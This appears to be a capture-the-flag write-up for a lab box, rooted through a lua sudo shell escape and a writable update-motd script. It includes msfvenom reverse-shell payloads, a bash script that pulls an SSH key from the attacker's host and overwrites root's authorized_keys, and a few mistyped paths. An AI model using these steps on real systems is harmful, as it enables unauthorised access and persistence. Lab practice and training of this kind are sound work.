To start, nmap comes back with ports 80 and 22 open, so naturally we go check out the web page.

Web page has been 'owned', and the person who did so kindly left a backdoor to the server.
Initially my assumption was to jump into dirb or gobuster and try to enumerate where that door might be, but that doesn't get us anything here. Instead, looking at the page source gives us this comment:

"<!--Some of the best web shells that you might need ;)-->"

If we google that phrase we get a github page where the author is shown to be the same user who owned the site. Scrolling down the list of web shells, we can throw all of them into the end of the URL until one works for us.
if we also click on the link for that particular shell in the github repo we found we get a set of default creds. Using them on the web shell gets us in nicely.

Wonderful, we have a web shell. This shell is fully functional and you can use it to priv-esc to the actual user, but I didn't want to deal with it so I compiled my own php shell with msfvenom, uploaded it, set up a metasploit handler to catch the connection, accessed my shell url, and used that shell going forward:

msfvenom -p php/meterpreter_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.php

Once we have this shell, time to enumerate. You can do this manually, but to save time I used the linux enumeration script found here (https://github.com/diego-treitos/linux-smart-enumeration), using wget to download the script directly to the machine to run:

wget "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -O lse.sh;chmod 700 lse.sh

Running that script shows us that we have a command we're allowed to run as sudo, /home/sysadmin/luvit. If we also take a look at our home directory we have a file called note.txt which explains the sysadmin left us a way to mess around with lua, which is probably that file. We can run the file with the following command:

sudo -u sysadmin /home/sysadmin/luvit

Running it, however, gets us an error. Specifically, we get a *traceback* error that the script tries to call a method that doesn't exist. Going by the name of the machine, we're on the right track. 
Combing that output from the traceback might not give you much at first glance, but when I tried to throw the output of running luvit into a text file I noticed the error message was not included, but that the end of the command shows a carrot character, which seemed to me to indicate this was the lua interpreter, similar to the python interpreter. Therefore, we might be able to pass it a command or script, which ended up working. I used this link (https://justhack.in/shell-escapes-cheatsheet) to grab a very easy shell escape script, which I uploaded to the host and ran appended with the same luvit command:

meterpreter>upload shell.lua ./shell.lua

sudo -u sysadmin /host/sysadmin/luvit shell.lua

This got me a functional bash shell for the sysadmin user, but it was still coming through the webadmin user's meterpreter shell, which was a pain. I generated a second shell, this time just a standard linux reverse tcp meterpreter shell, uploaded it using the webadmin account since sysadmin didn't really have any write permissions, created a new handler to catch the shell, then ran it as the sysadmin user to finally get a sysadmin meterpreter shell:

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f elf > shell.elf

meterpreter>upload shell.elf ./shell.elf

sudo -u sysadmin /host/sysadmin/luvit shell.lua

/home/webadmin/shell.elf

Now we have an actual user shell and can grab the user flag. Running the same linux enumeration script shows that we can access and write to the /etc/.update-motd.d/ files, which are bash scripts that generate the welcome message when someone ssh's into the server. There is a script that constantly overwrites them with the defaults, so we'll have to be fast when we use those to priv esc to root. However, we'll also have to be able to ssh into this host in order for the host to run the scripts that normally generate the welcome message. Going back to the initial webadmin shell, we are able to navigate to /home/webadmin/.ssh and edit the authorized_keys file, which is the file that stores the public ssh key. We can then ssh back to the host as that user using the corresponding private key.
To do this, I used ssh-keygen to create the key pair on my local kali machine, used meterpreter's upload functionality to drop the file into /home/webadmin/.ssh, and copied the public key's contents into the authorized_keys file. ssh-keygen walks you through the process, it generates both the public and private keys. Once that was done, I tested that I was able to ssh to the host as webadmin, which I was, so we're ready to exploit the update-motd files. 
Since the etc/.upload-motd.d files are quickly overwritten (they're maybe there for 5 seconds before going back to the original set) I couldn't upload a reverse shell, as it would instantly die. What we can do as root, though, is add another set of ssh keys so we can just ssh to the box as root. To do so, we need to replace the motd file and ssh into the box as webadmin to execute the script all within 5 seconds before the files are overwritten. Multiple shell windows queued and ready to go helps here. I hosted the directory with the ssh keys using python's SimpleHTTPServer, and grabbed them with the bash script that we replaced the motd header with:

Local machine (from the directory with the bash script '00-header' inside):
python -m SimpleHTTPServer 80

Bash script:
#!/bin/sh
wget http://10.10.14.4/root-key-rsa.pub -P /root/.ssh
cat /root/.ssh/root-key-rsa.pub > /root/.ssh/authorized_keys

Sysadmin shell:
meterpreter>upload 00-header /etc/.update-motd.d/00-header
meterpreter> cat 00-header
###### that cat is to confirm 00-header is the correct file ######

Local machine (separate shell window)
ssh -i ./webadmin-rsa-key webadmin@10.10.10.181

As long as the sysadmin shell command and the ssh command were done closely enough together and in sequence, the root ssh key overwrite works well. Now we can just ssh back to the host as root using that new ssh key, grab the root flag, and finish this box off entirely

ssh -i ./root-key-rsa root@10.10.10.181
